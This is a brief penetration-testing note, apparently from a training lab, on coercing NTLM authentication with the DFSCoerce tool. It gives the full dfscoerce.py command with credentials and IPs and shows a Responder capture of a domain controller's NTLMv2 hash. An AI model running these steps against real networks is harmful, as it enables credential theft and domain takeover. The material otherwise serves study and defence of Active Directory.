# NTLM\_Relaying

### **DFSCoerce**

Documentation: [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979)

### MS-DFSNM DFSCoerce

* DFSCoerce abuses the NetrDfsAddStdRoot and NetrDfsRemoveStdRoot methods of Distributed File System (DFS):
* Namespace Management Protocol (MS-DFSNM);
* (DFSCoerce does not seem capable of coercing HTTP NTLM authentication)
* https://github.com/Wh04m1001/DFSCoerce

```
python3 dfscoerce.py -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' 172.16.117.30 172.16.117.3 
[-] Connecting to ncacn_np:172.16.117.3[\PIPE\netdfs] 
[+] Successfully bound! 
[-] Sending NetrDfsRemoveStdRoot! NetrDfsRemoveStdRoot ServerName: '172.16.117.30\x00' RootShare: 'test\x00' ApiFlags: 1
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
```

#### Responder

* don't forget to start responder so you can capture the ntlm credential

```
[SMB] NTLMv2-SSP Client : 172.16.117.3 
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\DC01$ 
[SMB] NTLMv2-SSP Hash : DC01$::INLANEFREIGHT:e2d2339638fc5fd6:D4979A923DD76BC3CFA418E94958E2B0:010100000000000000E0550D97C<SNIP>
```
